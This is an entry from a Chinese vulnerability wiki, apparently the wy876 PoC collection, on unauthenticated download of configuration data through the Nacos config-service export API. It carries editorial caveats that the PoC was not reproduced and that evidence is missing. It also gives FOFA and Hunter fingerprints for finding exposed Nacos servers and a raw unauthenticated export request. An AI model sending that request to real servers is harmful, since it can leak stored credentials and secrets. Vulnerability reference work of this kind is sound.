---
source: "wy876 漏洞文库"
title: "Nacos存在未授权下载配置信息漏洞"
product: "Nacos Config Service export API"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "对应版本导出API可达、认证缺失或绕过、配置实际含敏感信息"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-259374702b1ce98714c19cf3"
entity_id: "ve-259374702b1ce98714c19cf3"
schema_version: "1"
previous_fofa_unverified: "app.name="
fofa: "icon_hash=\"13942501\""
---

# Nacos存在未授权下载配置信息漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：对应版本导出API可达、认证缺失或绕过、配置实际含敏感信息
- 证据范围：给无Cookie请求但没有响应或对照，不能证明未授权成立

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 缺Nacos版本、auth开关和接口权限根因
- 默认/nacos前缀省略须说明代理context；空Host只占位
- fofa错字段且不完整，缺修复来源

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介

<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在未授权下载配置信息漏洞 </font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ fofa `icon_hash="13942501"`
+ 特征


# 四、漏洞复现
```http
GET /v1/cs/configs?export=true&group=&tenant=&appName=&ids=&dataId= HTTP/1.1
Host: 
If-Modified-Since: Wed, 03 Apr 2024 06:25:07 GMT
Priority: u=0, i
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ssg3fe6cnv42gbrw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
